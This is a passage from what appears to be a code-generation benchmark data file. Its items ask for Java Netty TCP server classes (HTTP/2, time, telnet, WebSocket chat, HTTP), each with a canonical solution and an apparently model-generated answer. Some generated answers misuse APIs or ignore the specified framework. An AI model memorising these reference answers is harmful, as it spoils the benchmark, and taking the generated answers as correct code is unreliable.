    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your custom handler here\n                     p.addLast(new CustomTcpRequestHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Implement an abstract HTTP/2 server transport class using Java Netty framework that handles TCP communication, manages server lifecycle (start/stop), and supports SSL encryption.\n\nClass Description: AbstractHttp2ServerTransport is an abstract base class for creating HTTP/2 server transports using Netty. It manages server bootstrap configuration, event loop groups, and provides core server functionality including SSL support and connection management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging server events and errors\n- serverBootstrap: ServerBootstrap - Netty server bootstrap instance for configuring and starting the server\n- bizGroup: EventLoopGroup - Event loop group for handling business logic and I/O operations\n- transportConfig: ServerTransportConfig - Configuration object containing server parameters like host, port, and various TCP options\n\nMethods:\n- AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) -> None - Constructor that initializes the transport with configuration\n- start() -> boolean - Starts the HTTP/2 server, initializes event loop groups, configures server bootstrap with TCP options and handlers, and binds to the specified host/port. Returns true if successful\n- stop() -> None - Shuts down the server gracefully, closing event loop groups and releasing resources\n- (inherited methods from ServerTransport superclass would be listed here if applicable)\n\nInput:\n- For constructor: ServerTransportConfig object containing server configuration parameters\n- For start(): None (uses internal state)\n- For stop(): None (uses internal state)\n\nOutput:\n- For start(): boolean indicating success/failure of server startup\n- For stop(): None (performs cleanup operations)",
    "Canonical_solution": "import com.alipay.sofa.rpc.core.exception.SofaRpcRuntimeException;\nimport com.alipay.sofa.rpc.log.LogCodes;\nimport com.alipay.sofa.rpc.log.Logger;\nimport com.alipay.sofa.rpc.log.LoggerFactory;\nimport com.alipay.sofa.rpc.server.http.HttpServerHandler;\nimport com.alipay.sofa.rpc.transport.ServerTransport;\nimport com.alipay.sofa.rpc.transport.ServerTransportConfig;\nimport com.alipay.sofa.rpc.transport.netty.NettyHelper;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\n\nimport java.net.InetSocketAddress;\n\npublic abstract class AbstractHttp2ServerTransport extends ServerTransport {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n\n    private volatile ServerBootstrap serverBootstrap;\n    private EventLoopGroup bizGroup;\n\n    protected AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        super(transportConfig);\n    }\n\n    @Override\n    public boolean start() {\n        if (serverBootstrap != null) {\n            return true;\n        }\n        synchronized (this) {\n            if (serverBootstrap != null) {\n                return true;\n            }\n            boolean flag = false;\n            SslContext sslCtx = SslContextBuilder.build();\n\n            EventLoopGroup bossGroup = NettyHelper.getServerBossEventLoopGroup(transportConfig);\n            HttpServerHandler httpServerHandler = (HttpServerHandler) transportConfig.getServerHandler();\n            bizGroup = NettyHelper.getServerBizEventLoopGroup(transportConfig, httpServerHandler.getBizThreadPool());\n\n            serverBootstrap = new ServerBootstrap();\n            serverBootstrap.group(bossGroup, bizGroup)\n                .channel(transportConfig.isUseEpoll() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, transportConfig.getBacklog())\n                .option(ChannelOption.SO_REUSEADDR, transportConfig.isReuseAddr())\n                .option(ChannelOption.RCVBUF_ALLOCATOR, NettyHelper.getRecvByteBufAllocator())\n                .option(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.SO_KEEPALIVE, transportConfig.isKeepAlive())\n                .childOption(ChannelOption.TCP_NODELAY, transportConfig.isTcpNoDelay())\n                .childOption(ChannelOption.SO_RCVBUF, 8192 * 128)\n                .childOption(ChannelOption.SO_SNDBUF, 8192 * 128)\n                .handler(new LoggingHandler(LogLevel.DEBUG))\n                .childOption(ChannelOption.ALLOCATOR, NettyHelper.getByteBufAllocator())\n                .childOption(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(\n                    transportConfig.getBufferMin(), transportConfig.getBufferMax()))\n                .childHandler(new Http2ServerChannelInitializer(bizGroup, sslCtx,\n                    httpServerHandler, transportConfig.getPayload()));\n\n            ChannelFuture future = serverBootstrap.bind(\n                new InetSocketAddress(transportConfig.getHost(), transportConfig.getPort()));\n            ChannelFuture channelFuture = future.addListener(new ChannelFutureListener() {\n                @Override\n                public void operationComplete(ChannelFuture future) throws Exception {\n                    if (future.isSuccess()) {\n                        if (LOGGER.isInfoEnabled()) {\n                            LOGGER.info(\"HTTP/2 Server bind to {}:{} success!\",\n                                transportConfig.getHost(), transportConfig.getPort());\n                        }\n                    } else {\n                        LOGGER.error(LogCodes.getLog(LogCodes.ERROR_HTTP2_BIND, transportConfig.getHost(),\n                            transportConfig.getPort()));\n                        stop();\n                    }\n                }\n            });\n\n            try {\n                channelFuture.await();\n                if (channelFuture.isSuccess()) {\n                    flag = Boolean.TRUE;\n                } else {\n                    throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_START_SERVER, \"HTTP/2\"),\n                        future.cause());\n                }\n            } catch (InterruptedException e) {\n                LOGGER.error(e.getMessage(), e);\n            }\n            return flag;\n        }\n    }\n\n    @Override\n    public void stop() {\n        if (LOGGER.isInfoEnabled()) {\n            LOGGER.info(\"Shutdown the SOFA RPC HTTP/2 server transport now...\");\n        }\n        NettyHelper.closeServerBossEventLoopGroup(transportConfig);\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        serverBootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic abstract class AbstractHttp2ServerTransport {\n    private static final Logger LOGGER = LoggerFactory.getLogger(AbstractHttp2ServerTransport.class);\n    protected ServerBootstrap serverBootstrap;\n    protected EventLoopGroup bizGroup;\n    protected ServerTransportConfig transportConfig;\n\n    public AbstractHttp2ServerTransport(ServerTransportConfig transportConfig) {\n        this.transportConfig = transportConfig;\n        this.serverBootstrap = new ServerBootstrap();\n        this.bizGroup = new NioEventLoopGroup(transportConfig.getBusinessThreads());\n    }\n\n    public boolean start() {\n        try {\n            SslContext sslCtx = SslContextBuilder.forServer(transportConfig.getKeyStorePath(), transportConfig.getKeyPassword())\n                    .build();\n\n            serverBootstrap.group(bizGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(sslCtx.newHandler(ch.alloc()));\n                            // Add other handlers as needed\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = serverBootstrap.bind(transportConfig.getHost(), transportConfig.getPort()).sync();\n            return f.isSuccess();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            LOGGER.error(\"Failed to bind server socket\", e);\n            return false;\n        }\n    }\n\n    public void stop() {\n        if (bizGroup != null) {\n            bizGroup.shutdownGracefully();\n        }\n        // Additional cleanup can be added here if necessary\n    }\n}\n```"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process time-related requests.\n\nClass Description: The TimeServer class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses Netty's event-driven architecture to efficiently handle multiple concurrent connections. The server processes incoming requests through a pipeline of handlers and responds with time-related information.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nconstructor: TimeServer(int port) -> void - Initializes the server with the specified port number\nrun: run() -> void - Starts the server, binds it to the specified port, and begins accepting client connections. This method handles the server's lifecycle including startup, operation, and graceful shutdown. Throws Exception if any error occurs during server operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class TimeServer {\n\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new TimeEncoder());\n                     ch.pipeline().addLast(new TimeServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class TimeServer {\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new TimeServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        new TimeServer(port).run();\n    }\n}\n```\n\nThis Java class `TimeServer` sets up a TCP server using the Netty framework. It listens on a specified port for incoming client connections. The server uses Netty's event-driven architecture to manage multiple concurrent connections efficiently. It includes a handler (`TimeServerHandler`) to process incoming requests and respond with time-related information. The `run` method starts the server, binds it to the specified port, and handles the server's lifecycle, ensuring graceful shutdown upon termination."
  },
  {
    "Task_id": 188,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data through a configured pipeline of handlers.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer: [constructor](int port) -> void - Initializes the server with the specified port number\nrun: [method]() throws Exception -> void - Starts the server, binds to the configured port, and begins accepting client connections. Sets up the server bootstrap with worker threads, channel type, and handler pipeline. Includes proper resource cleanup on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"logging\", new LoggingHandler(LogLevel.INFO));\n                     ch.pipeline().addLast(\"codec\", new MyCodec());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your handlers here\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 189,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming telnet connections. It supports optional SSL encryption and provides graceful shutdown capabilities. The server uses a boss-worker thread model for handling connections efficiently.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n\nMethods:\n- start(): [void] throws [Exception] - Initializes and starts the TCP server. Configures SSL if enabled, sets up event loop groups, and binds to the specified port. The method blocks until the server is shut down.\n  - Input: None\n  - Output: None (but may throw exceptions during server setup or operation)\n  - Side effects: Starts a TCP server that listens for incoming connections and processes them using the configured pipeline handlers",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class TelnetServer {\n    private final boolean ssl;\n    private final int port;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ChannelFuture future;\n\n    public TelnetServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         SslContext sslCtx = createSslContext();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new TelnetServerHandler());\n                 }\n             });\n\n            future = b.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private SslContext createSslContext() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        return SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Change to true to enable SSL\n        int port = 8023;\n        new TelnetServer(ssl, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket chat server using Netty framework to handle TCP connections and manage client communications.\n\nClass Description: The WebSocketChatServer class is responsible for setting up and running a Netty-based TCP server that handles WebSocket connections for chat functionality. It manages server resources and gracefully shuts down when needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nWebSocketChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> None - Starts the server, binds it to the specified port, and keeps it running until shutdown is requested. Manages server resources and ensures proper cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class WebSocketChatServer {\n\n    private int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new WebSocketChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class WebSocketChatServer {\n    private final int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                     p.addLast(new ChatWebSocketFrameHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        new WebSocketChatServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests and responses.\n\nClass Description: The NettyTcpServer class provides functionality to start and stop a Netty-based TCP server that listens for HTTP requests on a specified port and responds with a predefined message. It manages server resources and lifecycle.\n\nAttributes:\n- ctx: ApplicationContext - The Micronaut application context for dependency injection and configuration\n- serverLoop: EventLoopGroup - The Netty event loop group that handles server I/O operations\n- server: ServerSocketChannel - The server socket channel that listens for incoming connections\n\nMethods:\n- startServer(int port) -> void - Starts the TCP server on the specified port. Initializes the server with an event loop group, configures the channel pipeline with HTTP codec and handler, and binds to the given port.\n  Input: port (int) - The port number to bind the server to\n  Output: None (throws Exception if server fails to start)\n\n- stopServer() -> void - Stops the server gracefully by shutting down the event loop group and closing the application context.\n  Input: None\n  Output: None\n\n- getPort() -> int - Returns the port number the server is bound to, or -1 if the server is not running.\n  Input: None\n  Output: int - The port number or -1 if server is not active",
    "Canonical_solution": "import io.micronaut.context.ApplicationContext;\nimport io.micronaut.http.HttpRequest;\nimport io.micronaut.http.body.CloseableAvailableByteBody;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport java.util.Map;\n\npublic class NettyTcpServer {\n\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n\n    public void startServer(int port) throws Exception {\n        ctx = ApplicationContext.run(Map.of(\"spec.name\", \"NettyTcpServer\"));\n        serverLoop = new NioEventLoopGroup(1);\n        server = (ServerSocketChannel) new ServerBootstrap()\n            .group(serverLoop)\n            .channel(NioServerSocketChannel.class)\n            .localAddress(port)\n            .childHandler(new ChannelInitializer<>() {\n                FullHttpResponse response;\n\n                @Override\n                public void handlerAdded(ChannelHandlerContext ctx) {\n                    ByteBuf resp = ctx.alloc().buffer();\n                    ByteBufUtil.writeAscii(resp, \"bar\");\n                    response = new DefaultFullHttpResponse(\n                        HttpVersion.HTTP_1_1, \n                        HttpResponseStatus.OK, \n                        resp, \n                        new DefaultHttpHeaders().add(HttpHeaderNames.CONTENT_LENGTH, resp.readableBytes()), \n                        EmptyHttpHeaders.INSTANCE\n                    );\n                }\n\n                @Override\n                protected void initChannel(@NonNull Channel ch) {\n                    ch.pipeline()\n                        .addLast(new HttpServerCodec())\n                        .addLast(new ChannelInboundHandlerAdapter() {\n                            boolean inBody = false;\n\n                            @Override\n                            public void channelRead(@NonNull ChannelHandlerContext ctx, @NonNull Object msg) throws Exception {\n                                if (!inBody) {\n                                    inBody = true;\n                                    if (!(msg instanceof FullHttpResponse)) {\n                                        return;\n                                    }\n                                }\n                                ((HttpContent) msg).release();\n                                if (msg instanceof LastHttpContent) {\n                                    ctx.writeAndFlush(new DefaultFullHttpResponse(\n                                        response.protocolVersion(),\n                                        response.status(),\n                                        response.content().retainedSlice(),\n                                        response.headers(),\n                                        response.trailingHeaders()\n                                    ));\n                                    inBody = false;\n                                }\n                            }\n                        });\n                }\n            })\n            .bind().syncUninterruptibly().channel();\n    }\n\n    public void stopServer() {\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n    }\n\n    public int getPort() {\n        return server != null ? server.localAddress().getPort() : -1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.ApplicationContext;\n\npublic class NettyTcpServer {\n    private ApplicationContext ctx;\n    private EventLoopGroup serverLoop;\n    private ServerSocketChannel server;\n    private int port = -1;\n\n    @Autowired\n    public NettyTcpServer(ApplicationContext ctx) {\n        this.ctx = ctx;\n    }\n\n    public void startServer(int port) throws Exception {\n        this.port = port;\n        serverLoop = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(serverLoop)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpRequestDecoder());\n                     p.addLast(new HttpResponseEncoder());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new ChunkedWriteHandler());\n                     p.addLast(new HttpServerHandler(ctx));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            server = (ServerSocketChannel) f.channel();\n            System.out.println(\"Netty server started on port \" + port);\n        